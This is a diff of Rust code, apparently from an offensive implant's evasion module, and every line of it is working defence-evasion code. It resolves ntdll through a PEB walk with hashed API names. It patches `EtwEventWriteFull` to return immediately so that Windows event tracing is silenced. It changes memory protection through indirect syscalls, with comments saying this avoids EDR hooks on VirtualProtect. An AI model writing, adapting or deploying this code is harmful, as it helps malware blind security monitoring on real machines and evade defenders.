@@ -7,20 +7,30 @@ use windows_sys::Win32::{
             SetThreadContext, GetThreadContext, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
         },
         Threading::GetCurrentThread,
-        LibraryLoader::GetModuleHandleA,
     },
 };
 
 #[cfg(target_os = "windows")]
 static mut ETW_ADDR: usize = 0;
 
+/// Resolve ntdll base: PEB walk on x64, GetModuleHandleA fallback elsewhere.
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn ntdll_base() -> *const u8 {
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};
+    const NTDLL_H: u32 = djb2_hash_lower(b"ntdll.dll");
+    peb_get_module_base(NTDLL_H)
+}
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
+unsafe fn ntdll_base() -> *const u8 {
+    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8
+}
+
 #[cfg(target_os = "windows")]
 pub unsafe fn install_etw_bypass() {
     use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
-    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
+    let ntdll = ntdll_base();
     if ntdll.is_null() { return; }
-    let etw_hash = djb2_hash(b"EtwEventWrite");
-    let etw_fn = match resolve_by_hash(ntdll, etw_hash) {
+    let etw_fn = match resolve_by_hash(ntdll, djb2_hash(b"EtwEventWrite")) {
         Some(p) => p,
         None => return,
     };
@@ -37,28 +47,38 @@ pub unsafe fn install_etw_bypass() {
     SetThreadContext(thread, &ctx);
 }
 
+/// Hot-patch EtwEventWriteFull with xor eax,eax; ret — blocks all ETW writes.
+/// Uses NtProtectVirtualMemory indirect syscall to avoid VirtualProtect hook.
 #[cfg(target_os = "windows")]
 pub unsafe fn patch_etw_full() {
     use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
-    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
 
-    let ntdll = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(
-        b"ntdll.dll\0".as_ptr()
-    ) as *const u8;
+    let ntdll = ntdll_base();
     if ntdll.is_null() { return; }
 
-    let hash = djb2_hash(b"EtwEventWriteFull");
-    let func = match resolve_by_hash(ntdll, hash) {
+    let func = match resolve_by_hash(ntdll, djb2_hash(b"EtwEventWriteFull")) {
         Some(p) => p as *mut u8,
-        None => return,
+        None    => return,
     };
 
-    // xor eax,eax (2 bytes) + ret (1 byte)
-    let patch = [0x33u8, 0xC0, 0xC3];
-    let mut old_protect = 0u32;
-    VirtualProtect(func as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
-    core::ptr::copy_nonoverlapping(patch.as_ptr(), func, patch.len());
-    VirtualProtect(func as _, patch.len(), old_protect, &mut old_protect);
+    let patch = [0x33u8, 0xC0, 0xC3]; // xor eax,eax; ret
+    let ph    = usize::MAX;
+
+    if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
+        let mut base = func as usize; let mut sz = patch.len(); let mut old = 0u32;
+        indirect_syscall(prot_ssn, prot_tramp, ph,
+            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
+            0x40, &mut old as *mut u32 as usize, 0); // PAGE_EXECUTE_READWRITE
+        core::ptr::copy_nonoverlapping(patch.as_ptr(), func, patch.len());
+        let mut base2 = func as usize; let mut sz2 = patch.len();
+        indirect_syscall(prot_ssn, prot_tramp, ph,
+            &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
+            old as usize, &mut old as *mut u32 as usize, 0);
+    } else {
+        // Fallback: write without changing permissions (may fault on RX memory)
+        core::ptr::copy_nonoverlapping(patch.as_ptr(), func, patch.len());
+    }
 }
 
 #[cfg(target_os = "windows")]
